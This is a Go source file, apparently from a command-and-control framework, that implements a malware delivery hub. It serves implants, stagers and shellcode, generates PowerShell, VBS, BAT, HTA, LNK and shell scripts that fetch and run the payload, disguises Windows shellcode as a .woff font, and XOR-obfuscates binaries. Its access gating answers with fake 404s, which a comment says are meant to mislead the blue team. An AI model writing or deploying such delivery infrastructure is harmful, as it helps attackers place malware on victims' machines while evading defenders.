package delivery

import (
	"BackendTemplate/pkg/config"
	"BackendTemplate/pkg/database"
	"crypto/rand"
	"crypto/subtle"
	"encoding/hex"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Resource types served by the hub
const (
	ResFull      = "full"
	ResStager    = "stager"
	ResShellcode = "sc"
	ResWoff      = "woff"
	ResPS1       = "ps1"
	ResVBS       = "vbs"
	ResBat       = "bat"
	ResHta       = "hta"
	ResLnk       = "lnk" // A6: 快捷方式交付脚本
	ResSh        = "sh"  // Linux shell 脚本载荷
)

// Payload holds in-memory patched binaries for one delivery profile
type Payload struct {
	Full      []byte
	Stager    []byte // optional; may be empty if build failed
	Shellcode []byte // optional windows shellcode / donut output
	FileName  string
}

// Profile is a live delivery entry
type Profile struct {
	Meta    database.WebDelivery
	Payload Payload
	// one-time flags: after successful serve, mark consumed
	fullUsed   int32
	stagerUsed int32
	scUsed     int32
}

// Hub is the central delivery router (shared mode)
type Hub struct {
	mu       sync.RWMutex
	byKey    map[string]*Profile // public_key -> profile
	byPort   map[string]*Profile // listening_port -> profile (legacy lookup)
	mainPort int                 // teamserver port for URL building
}

var GlobalHub = NewHub()

func NewHub() *Hub {
	return &Hub{
		byKey:  make(map[string]*Profile),
		byPort: make(map[string]*Profile),
	}
}

func (h *Hub) SetMainPort(port int) {
	h.mu.Lock()
	h.mainPort = port
	h.mu.Unlock()
}

func (h *Hub) MainPort() int {
	h.mu.RLock()
	defer h.mu.RUnlock()
	return h.mainPort
}

// RandomKey generates a short public key
func RandomKey(n int) string {
	if n <= 0 {
		n = 8
	}
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)[:n*2]
	// hex is 2*n chars; for n=8 -> 16 hex chars. Prefer shorter:
}

// ShortKey returns ~10 char url-safe key
func ShortKey() string {
	b := make([]byte, 6)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b) // 12 hex chars
}

// Register adds/updates a live profile
func (h *Hub) Register(meta database.WebDelivery, payload Payload) {
	if meta.PublicKey == "" {
		meta.PublicKey = ShortKey()
	}
	p := &Profile{Meta: meta, Payload: payload}
	h.mu.Lock()
	h.byKey[meta.PublicKey] = p
	if meta.ListeningPort != "" && meta.ListeningPort != "shared" {
		h.byPort[meta.ListeningPort] = p
	}
	h.mu.Unlock()
}

// Unregister removes by public key or listening port
func (h *Hub) Unregister(publicKey, port string) {
	h.mu.Lock()
	defer h.mu.Unlock()
	if publicKey != "" {
		if p, ok := h.byKey[publicKey]; ok {
			delete(h.byKey, publicKey)
			if p.Meta.ListeningPort != "" {
				delete(h.byPort, p.Meta.ListeningPort)
			}
		}
	}
	if port != "" {
		if p, ok := h.byPort[port]; ok {
			delete(h.byPort, port)
			delete(h.byKey, p.Meta.PublicKey)
		}
	}
}

func (h *Hub) GetByKey(key string) (*Profile, bool) {
	h.mu.RLock()
	defer h.mu.RUnlock()
	p, ok := h.byKey[key]
	return p, ok
}

func (h *Hub) GetByPort(port string) (*Profile, bool) {
	h.mu.RLock()
	defer h.mu.RUnlock()
	p, ok := h.byPort[port]
	return p, ok
}

func (h *Hub) ListKeys() []string {
	h.mu.RLock()
	defer h.mu.RUnlock()
	keys := make([]string, 0, len(h.byKey))
	for k := range h.byKey {
		keys = append(keys, k)
	}
	return keys
}

// PublicURLOptions 可选覆盖（一般用全局 config + meta 字段）
type PublicURLOptions struct {
	Scheme   string
	Host     string
	BasePath string
}

// effectiveDeliveryDefaults 读取全局 delivery 配置
func effectiveDeliveryDefaults() config.DeliveryConfig {
	cfg := config.DeliveryConfig{
		DefaultScheme:     "http",
		OmitDefaultPort:   true,
		TrustProxyHeaders: true,
	}
	if g := config.GetGlobalConfig(); g != nil {
		d := g.Delivery
		if d.DefaultScheme != "" {
			cfg.DefaultScheme = d.DefaultScheme
		}
		cfg.DefaultHost = d.DefaultHost
		cfg.BasePath = d.BasePath
		cfg.ForceHTTPS = d.ForceHTTPS
		cfg.OmitDefaultPort = d.OmitDefaultPort
		cfg.CacheMaxAge = d.CacheMaxAge
		cfg.CORSAllowOrigin = d.CORSAllowOrigin
		cfg.TrustProxyHeaders = d.TrustProxyHeaders
		// server.external_ip 可作为 host 回退
		if cfg.DefaultHost == "" && g.Server.ExternalIP != "" {
			if g.Server.Port > 0 && g.Server.Port != 80 && g.Server.Port != 443 {
				cfg.DefaultHost = fmt.Sprintf("%s:%d", g.Server.ExternalIP, g.Server.Port)
			} else {
				cfg.DefaultHost = g.Server.ExternalIP
			}
		}
	}
	return cfg
}

func normalizeScheme(s string, forceHTTPS bool) string {
	s = strings.ToLower(strings.TrimSpace(s))
	if forceHTTPS {
		return "https"
	}
	if s == "https" || s == "http" {
		return s
	}
	return "http"
}

func normalizeBasePath(bp string) string {
	bp = strings.TrimSpace(bp)
	if bp == "" || bp == "/" {
		return ""
	}
	if !strings.HasPrefix(bp, "/") {
		bp = "/" + bp
	}
	return strings.TrimRight(bp, "/")
}

func stripDefaultPort(host, scheme string, omit bool) string {
	if !omit || host == "" {
		return host
	}
	// host may be host:port
	h, p, ok := strings.Cut(host, ":")
	if !ok {
		return host
	}
	// skip if IPv6-like with brackets
	if strings.HasPrefix(host, "[") {
		return host
	}
	if scheme == "https" && p == "443" {
		return h
	}
	if scheme == "http" && p == "80" {
		return h
	}
	return host
}

// BuildPublicURLs fills ServerAddress / StagerURL / ShellcodeURL
// 支持 HTTPS、域名、CDN base_path；优先级：meta 字段 > 全局 delivery 配置 > 监听器推断
func BuildPublicURLs(meta *database.WebDelivery, mainPort int) {
	defs := effectiveDeliveryDefaults()

	scheme := normalizeScheme(meta.PublicScheme, defs.ForceHTTPS)
	if meta.PublicScheme == "" && !defs.ForceHTTPS {
		scheme = normalizeScheme(defs.DefaultScheme, false)
	}

	host := strings.TrimSpace(meta.PublicHost)
	if host == "" {
		host = strings.TrimSpace(defs.DefaultHost)
	}
	// 若 host 自带 scheme，拆开
	if strings.Contains(host, "://") {
		if u := strings.SplitN(host, "://", 2); len(u) == 2 {
			if meta.PublicScheme == "" && !defs.ForceHTTPS {
				scheme = normalizeScheme(u[0], defs.ForceHTTPS)
			}
			host = u[1]
		}
	}
	host = strings.TrimRight(host, "/")

	if host == "" {
		// try parse from listener connect address
		if parts := strings.SplitN(meta.ListenerConfig, "://", 2); len(parts) == 2 {
			addr := parts[1]
			if i := strings.Index(addr, "/"); i > 0 {
				addr = addr[:i]
			}
			addr = strings.Replace(addr, "0.0.0.0", "127.0.0.1", 1)
			if hp := strings.Split(addr, ":"); len(hp) >= 1 && hp[0] != "" {
				if meta.BindMode == "dedicated" && meta.ListeningPort != "" && !strings.HasPrefix(meta.ListeningPort, "shared") {
					host = hp[0] + ":" + meta.ListeningPort
				} else if mainPort > 0 {
					host = hp[0] + ":" + fmt.Sprintf("%d", mainPort)
				} else {
					host = addr
				}
			}
		}
		if host == "" {
			if meta.BindMode == "dedicated" && meta.ListeningPort != "" && !strings.HasPrefix(meta.ListeningPort, "shared") {
				host = "127.0.0.1:" + meta.ListeningPort
			} else if mainPort > 0 {
				host = fmt.Sprintf("127.0.0.1:%d", mainPort)
			} else {
				host = "127.0.0.1"
			}
		}
	}

	host = stripDefaultPort(host, scheme, defs.OmitDefaultPort)

	basePath := normalizeBasePath(meta.BasePath)
	if basePath == "" {
		basePath = normalizeBasePath(defs.BasePath)
	}

	keyPath := meta.URIPath
	if keyPath == "" {
		keyPath = meta.PublicKey
	}
	keyPath = strings.Trim(keyPath, "/")

	// {scheme}://{host}{basePath}/d/{key}
	base := fmt.Sprintf("%s://%s%s/d/%s", scheme, host, basePath, keyPath)

	fname := meta.FileName
	if fname == "" {
		fname = "payload"
	}
	meta.ServerAddress = base + "/full/" + fname
	meta.StagerURL = base + "/stager"
	meta.ShellcodeURL = base + "/sc"
	if strings.ToLower(meta.OS) == "windows" {
		meta.ShellcodeURL = base + "/woff"
	}
}

// ApplyDeliveryHeaders sets CDN-friendly cache/CORS headers on delivery responses
func ApplyDeliveryHeaders(w http.ResponseWriter, contentType string) {
	defs := effectiveDeliveryDefaults()
	if contentType != "" {
		w.Header().Set("Content-Type", contentType)
	}
	if defs.CacheMaxAge > 0 {
		w.Header().Set("Cache-Control", fmt.Sprintf("public, max-age=%d", defs.CacheMaxAge))
	} else {
		w.Header().Set("Cache-Control", "no-store")
	}
	if origin := strings.TrimSpace(defs.CORSAllowOrigin); origin != "" {
		w.Header().Set("Access-Control-Allow-Origin", origin)
		w.Header().Set("Access-Control-Allow-Methods", "GET, OPTIONS, HEAD")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-Delivery-Token")
	}
	// help CDN vary on token query if used
	w.Header().Set("Vary", "Origin")
}

// ServeHTTP handles /d/{key}/{resource}[/{filename}]
func (h *Hub) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	// CDN / 浏览器预检
	if r.Method == http.MethodOptions {
		ApplyDeliveryHeaders(w, "")
		w.WriteHeader(http.StatusNoContent)
		return
	}
	// path: /d/{key}/full[/name] | /d/{key}/stager | /d/{key}/sc | /d/{key}/woff
	// 兼容 CDN base_path：允许 /static/d/... 形式（反代可能保留前缀）
	path := r.URL.Path
	if i := strings.Index(path, "/d/"); i >= 0 {
		path = path[i+len("/d/"):]
	} else {
		path = strings.TrimPrefix(path, "/d/")
	}
	path = strings.Trim(path, "/")
	parts := strings.Split(path, "/")
	if len(parts) < 2 {
		http.NotFound(w, r)
		return
	}
	key := parts[0]
	resource := parts[1]

	p, ok := h.GetByKey(key)
	// also allow URIPath as key alias: scan
	if !ok {
		h.mu.RLock()
		for _, prof := range h.byKey {
			alias := strings.Trim(prof.Meta.URIPath, "/")
			if alias != "" && alias == key {
				p = prof
				ok = true
				break
			}
			// public key match already handled
		}
		h.mu.RUnlock()
	}
	if !ok || p == nil {
		http.NotFound(w, r)
		return
	}
	if p.Meta.Status != 1 {
		// 伪装 404：投递已关闭不暴露语义
		logAccess(p, resource, r, http.StatusNotFound, 0)
		http.NotFound(w, r)
		return
	}

	// access controls
	// 【防盗门】优先校验 StagerToken（配额令牌，一次一密）：请求携带的令牌命中
	// StagerToken 记录 → 扣减配额；未命中则回退 AccessToken/UA 逻辑。
	token := r.Header.Get("X-Delivery-Token")
	if token == "" {
		token = r.URL.Query().Get("t")
	}
	if token == "" {
		token = r.URL.Query().Get("token")
	}
	if token != "" && ConsumeStagerToken(p.Meta.PublicKey, token, clientIP(r)) {
		// 门禁令牌有效：直接放行（不再要求 AccessToken）
	} else if !checkAccess(p, r) {
		logAccess(p, resource, r, http.StatusNotFound, 0)
		// 伪装 404：让蓝队以为是"URL 不存在"，不暴露令牌/访问控制语义
		http.NotFound(w, r)
		return
	}

	var data []byte
	var contentType string
	var filename string
	var oneTimeFlag *int32

	switch resource {
	case ResFull, "file", "payload":
		data = p.Payload.Full
		contentType = p.Meta.ContentType
		if contentType == "" {
			contentType = "application/octet-stream"
		}
		filename = p.Meta.FileName
		if filename == "" {
			filename = p.Payload.FileName
		}
		if filename == "" {
			filename = "payload.bin"
		}
		oneTimeFlag = &p.fullUsed
	case ResStager:
		data = p.Payload.Stager
		contentType = p.Meta.ContentType
		if contentType == "" {
			contentType = "application/octet-stream"
		}
		filename = "stager"
		if p.Meta.OS == "windows" {
			filename = "stager.exe"
		}
		oneTimeFlag = &p.stagerUsed
	case ResShellcode, "bin":
		data = p.Payload.Shellcode
		contentType = p.Meta.StageContentType
		if contentType == "" {
			contentType = "application/octet-stream"
		}
		filename = "payload.bin"
		oneTimeFlag = &p.scUsed
	case ResWoff:
		data = p.Payload.Shellcode
		if len(data) == 0 {
			data = p.Payload.Stager
		}
		contentType = p.Meta.StageContentType
		if contentType == "" {
			contentType = "font/woff"
		}
		filename = p.Meta.FileName + ".woff"
		if p.Meta.FileName == "" {
			filename = "font.woff"
		}
		oneTimeFlag = &p.scUsed
	case ResPS1, ResVBS, ResBat, ResHta, ResLnk, ResSh:
		// 脚本载荷：运行时从 /d/{key}/full 拉取并执行；?mode=embed 内嵌 base64（ps1/bat 支持）
		if len(p.Payload.Full) == 0 {
			http.Error(w, "resource not available", http.StatusNotFound)
			logAccess(p, resource, r, http.StatusNotFound, 0)
			return
		}
		scheme := "http"
		if r.TLS != nil {
			scheme = "https"
		}
		host := r.Host
		if host == "" {
			host = "127.0.0.1"
		}
		basePath := normalizeBasePath(p.Meta.BasePath)
		keyPath := strings.Trim(p.Meta.URIPath, "/")
		if keyPath == "" {
			keyPath = p.Meta.PublicKey
		}
		fname := p.Meta.FileName
		if fname == "" {
			fname = p.Payload.FileName
		}
		if fname == "" {
			fname = "payload.bin"
		}
		fullURL := fmt.Sprintf("%s://%s%s/d/%s/full/%s", scheme, host, basePath, keyPath, url.PathEscape(fname))
		// 【修复】配置了 AccessToken 的投递，下载 URL 必须携带 ?t=token，
		// 否则脚本运行时拉取 full 载荷必然 403
		if p.Meta.AccessToken != "" {
			fullURL += "?t=" + url.QueryEscape(p.Meta.AccessToken)
		}
		data = GenerateScript(resource, r.URL.Query().Get("mode"), fullURL, p.Meta.DownloadPath, p.Meta.SaveFilename, p.Meta.Pass, p.Payload.Full)
		contentType = ScriptContentType(resource)
		filename = ScriptFileName(resource)
	default:
		http.NotFound(w, r)
		return
	}

	if len(data) == 0 {
		// 伪装 404
		http.NotFound(w, r)
		logAccess(p, resource, r, http.StatusNotFound, 0)
		return
	}

	// one-time check（CAS 原子消费：并发请求只有一个能通过，避免双重消费）
	if p.Meta.OneTime == 1 && oneTimeFlag != nil {
		if !atomic.CompareAndSwapInt32(oneTimeFlag, 0, 1) {
			// 一次性链接已用：伪装 404
			http.NotFound(w, r)
			logAccess(p, resource, r, http.StatusNotFound, 0)
			return
		}
	}

	// max downloads
	if p.Meta.MaxDownloads > 0 && p.Meta.HitCount >= int64(p.Meta.MaxDownloads) {
		// 达到下载上限：伪装 404
		http.NotFound(w, r)
		logAccess(p, resource, r, http.StatusNotFound, 0)
		return
	}

	// 【隐身衣】Stage 载荷 XOR 混淆：配置了 XorKey 的投递，二进制载荷（full/stager/
	// shellcode/woff）加密下发，Stager/客户端内置同 key 解密。脚本类（ps1/vbs/bat/hta）
	// 是文本模板不动。
	if p.Meta.XorKey != 0 && resource != ResPS1 && resource != ResVBS && resource != ResBat && resource != ResHta && resource != ResLnk && resource != ResSh {
		enc, err := XorEncode(data, byte(p.Meta.XorKey))
		if err == nil {
			data = enc
		}
	}

	ApplyDeliveryHeaders(w, contentType)
	// only set attachment for obvious binary downloads; fonts/js look more natural inline
	if !strings.Contains(contentType, "font") && !strings.Contains(contentType, "javascript") && !strings.Contains(contentType, "image") {
		w.Header().Set("Content-Disposition", "attachment; filename="+filename)
	}
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
	n, _ := w.Write(data)

	// one-time 已在下载前 CAS 置位，无需再次写入

	// stats
	incHit(p, clientIP(r))
	logAccess(p, resource, r, http.StatusOK, int64(n))
}

func checkAccess(p *Profile, r *http.Request) bool {
	// token
	if tok := strings.TrimSpace(p.Meta.AccessToken); tok != "" {
		q := r.URL.Query().Get("t")
		if q == "" {
			q = r.URL.Query().Get("token")
		}
		if q == "" {
			q = r.Header.Get("X-Delivery-Token")
		}
		// 常数时间比较，防时序侧信道
		if subtle.ConstantTimeCompare([]byte(q), []byte(tok)) != 1 {
			return false
		}
	}
	// UA allow list：默认子串匹配（逗号分隔）；条目以 "=" 前缀时为完整 UA 匹配
	// （如 "=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"）
	if allow := strings.TrimSpace(p.Meta.UAAllow); allow != "" {
		ua := r.Header.Get("User-Agent")
		ok := false
		for _, part := range strings.Split(allow, ",") {
			part = strings.TrimSpace(part)
			if part == "" {
				continue
			}
			if strings.HasPrefix(part, "=") {
				if ua == strings.TrimPrefix(part, "=") {
					ok = true
					break
				}
			} else if strings.Contains(ua, part) {
				ok = true
				break
			}
		}
		if !ok {
			return false
		}
	}
	return true
}

func clientIP(r *http.Request) string {
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		parts := strings.Split(xff, ",")
		return strings.TrimSpace(parts[0])
	}
	if xri := r.Header.Get("X-Real-IP"); xri != "" {
		return xri
	}
	addr := r.RemoteAddr
	if i := strings.LastIndex(addr, ":"); i > 0 {
		return addr[:i]
	}
	return addr
}

func incHit(p *Profile, ip string) {
	p.Meta.HitCount++
	p.Meta.LastHitAt = time.Now().Format("2006-01-02 15:04:05")
	p.Meta.LastHitIP = ip
	// best-effort DB update
	if database.DB() != nil {
		_, _ = database.DB().Where("public_key = ?", p.Meta.PublicKey).
			Cols("hit_count", "last_hit_at", "last_hit_ip").
			Update(&database.WebDelivery{
				HitCount:  p.Meta.HitCount,
				LastHitAt: p.Meta.LastHitAt,
				LastHitIP: p.Meta.LastHitIP,
			})
		// also try by listening_port for legacy rows without public_key index match
		if p.Meta.ID > 0 {
			_, _ = database.DB().ID(p.Meta.ID).
				Cols("hit_count", "last_hit_at", "last_hit_ip").
				Update(&database.WebDelivery{
					HitCount:  p.Meta.HitCount,
					LastHitAt: p.Meta.LastHitAt,
					LastHitIP: p.Meta.LastHitIP,
				})
		}
	}
}

func logAccess(p *Profile, resource string, r *http.Request, code int, bytes int64) {
	if database.DB() == nil {
		return
	}
	entry := database.DeliveryAccessLog{
		DeliveryID: p.Meta.ID,
		PublicKey:  p.Meta.PublicKey,
		Resource:   resource,
		ClientIP:   clientIP(r),
		UserAgent:  r.Header.Get("User-Agent"),
		StatusCode: code,
		BytesSent:  bytes,
	}
	_, _ = database.DB().Insert(&entry)
}


// DefaultsView 前端可见的全局 delivery 默认
type DefaultsView struct {
	DefaultScheme     string `json:"defaultScheme"`
	DefaultHost       string `json:"defaultHost"`
	BasePath          string `json:"basePath"`
	ForceHTTPS        bool   `json:"forceHttps"`
	OmitDefaultPort   bool   `json:"omitDefaultPort"`
	CacheMaxAge       int    `json:"cacheMaxAge"`
	CORSAllowOrigin   string `json:"corsAllowOrigin"`
	TrustProxyHeaders bool   `json:"trustProxyHeaders"`
}

// GetDefaultsView 导出全局 delivery 配置快照
func GetDefaultsView() DefaultsView {
	d := effectiveDeliveryDefaults()
	return DefaultsView{
		DefaultScheme:     d.DefaultScheme,
		DefaultHost:       d.DefaultHost,
		BasePath:          d.BasePath,
		ForceHTTPS:        d.ForceHTTPS,
		OmitDefaultPort:   d.OmitDefaultPort,
		CacheMaxAge:       d.CacheMaxAge,
		CORSAllowOrigin:   d.CORSAllowOrigin,
		TrustProxyHeaders: d.TrustProxyHeaders,
	}
}

